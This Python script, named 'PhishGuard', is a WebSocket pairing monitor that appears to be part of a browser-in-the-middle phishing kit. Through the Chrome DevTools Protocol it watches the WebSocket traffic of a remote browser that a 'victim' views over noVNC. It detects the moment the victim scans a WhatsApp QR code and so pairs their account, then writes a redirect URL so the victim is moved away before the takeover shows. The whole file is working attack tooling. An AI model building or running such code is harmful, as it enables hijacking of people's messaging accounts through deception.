#!/usr/bin/env python3
"""PhishGuard WebSocket pairing monitor (CDP).

Watches the browser's WebSocket traffic over the Chrome DevTools Protocol —
including frames in Web Workers, which the page extension cannot see — to detect
a QR *pairing* the instant it happens (before the "loading your messages" UI and
before PAIRING_ACCEPTED). On detection it writes the campaign's redirect URL to
the file the noVNC viewer polls (pg-redirect.txt), redirecting the victim.

Only active for campaigns whose trigger is "scan". Encrypted WhatsApp frames are
not inspected for content — only their timing/volume, which is enough to tell a
scan (a burst of substantial traffic) from the idle QR page (tiny keepalives).
"""
import base64
import json
import os
import time
import urllib.request
from urllib.parse import urlparse

import websocket  # websocket-client

CDP_HTTP = "http://127.0.0.1:9223"
REDIRECT_FILE = "/opt/novnc/pg-redirect.txt"
CAMPAIGN_JSON = "/extensions/site-tweaker/campaign.json"
DEBUG = os.environ.get("PG_WS_DEBUG") == "1"

# Idle traffic is sparse: tiny keepalives, plus the occasional QR refresh which
# is just ~2 substantial frames (request + new QR) then quiet. A scan triggers a
# rapid multi-frame handshake. So we fire on a *sustained burst* of non-trivial
# frames — which happens during the pairing handshake, before the message sync
# ("loading your messages"). A grace delay skips the initial QR-setup exchange.
GRACE_MS = 2500
MIN_FRAME_BYTES = 90     # ignore tiny keepalives
BURST_FIRES = 4          # this many non-trivial frames (either direction)…
BURST_WINDOW_MS = 1500   # …within this window = a pairing handshake


def log(*a):
    if DEBUG:
        print("[ws-monitor]", *a, flush=True)


def read_campaign():
    try:
        with open(CAMPAIGN_JSON) as f:
            cfg = json.load(f)
        return cfg.get("trigger_action"), cfg.get("redirect_target")
    except Exception:
        return None, None


def http_json(path):
    req = urllib.request.Request(CDP_HTTP + path, headers={"Host": "localhost"})
    with urllib.request.urlopen(req, timeout=5) as r:
        return json.loads(r.read().decode())


def page_ws_url():
    for t in http_json("/json"):
        if t.get("type") == "page" and str(t.get("url", "")).startswith("http"):
            return t.get("webSocketDebuggerUrl")
    return None


def fire(url):
    try:
        with open(REDIRECT_FILE, "w") as f:
            f.write(url)
        log("FIRED ->", url)
    except Exception as e:
        log("write failed", e)


def frame_len(params):
    try:
        data = params.get("response", {}).get("payloadData", "")
        # payloadData is base64 for binary frames; approximate real size.
        try:
            return len(base64.b64decode(data))
        except Exception:
            return len(data)
    except Exception:
        return 0


def run():
    trigger, redirect = read_campaign()
    if trigger != "scan" or not redirect:
        log("not a scan campaign; monitor idle")
        return

    # Wait for a page target to exist.
    ws_url = None
    for _ in range(120):
        try:
            ws_url = page_ws_url()
        except Exception:
            ws_url = None
        if ws_url:
            break
        time.sleep(1)
    if not ws_url:
        log("no page target; giving up")
        return

    # Chrome reports the URL with whatever Host we sent (no port); connect to the
    # real loopback debugger port but keep Host: localhost so Chrome accepts it.
    path = urlparse(ws_url).path
    connect_url = "ws://127.0.0.1:9223" + path
    log("connecting", connect_url)
    ws = websocket.create_connection(connect_url, host="localhost", timeout=30)
    _id = [0]

    def send(method, params=None, sid=None):
        _id[0] += 1
        msg = {"id": _id[0], "method": method, "params": params or {}}
        if sid:
            msg["sessionId"] = sid
        ws.send(json.dumps(msg))

    # Watch the page and auto-attach to workers so we see their WS traffic too.
    send("Network.enable")
    send("Target.setAutoAttach", {"autoAttach": True, "waitForDebuggerOnStart": False, "flatten": True})

    start = time.time()
    first_frame = [0.0]
    burst = []

    while True:
        try:
            raw = ws.recv()
        except Exception as e:
            log("recv ended", e)
            return
        if not raw:
            continue
        try:
            msg = json.loads(raw)
        except Exception:
            continue

        method = msg.get("method")
        if method == "Target.attachedToTarget":
            sid = msg["params"].get("sessionId")
            if sid:
                send("Network.enable", sid=sid)
                log("attached worker target", msg["params"]["targetInfo"].get("type"))
            continue

        # Watch BOTH directions — the pairing exchange sends and receives frames
        # rapidly the moment the scan reaches the server, well before the UI.
        if method not in ("Network.webSocketFrameReceived", "Network.webSocketFrameSent"):
            continue

        now = time.time()
        if first_frame[0] == 0.0:
            first_frame[0] = now
        if (now - first_frame[0]) * 1000 < GRACE_MS:
            continue

        is_tx = method.endswith("Sent")
        n = frame_len(msg.get("params", {}))
        log("frame", "tx" if is_tx else "rx", n, "bytes")

        # Sustained burst of non-trivial frames = pairing handshake → fire.
        if n >= MIN_FRAME_BYTES:
            burst = [t for t in burst if (now - t) * 1000 <= BURST_WINDOW_MS]
            burst.append(now)
            log("burst", len(burst))
            if len(burst) >= BURST_FIRES:
                fire(redirect)
                return


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        log("fatal", e)
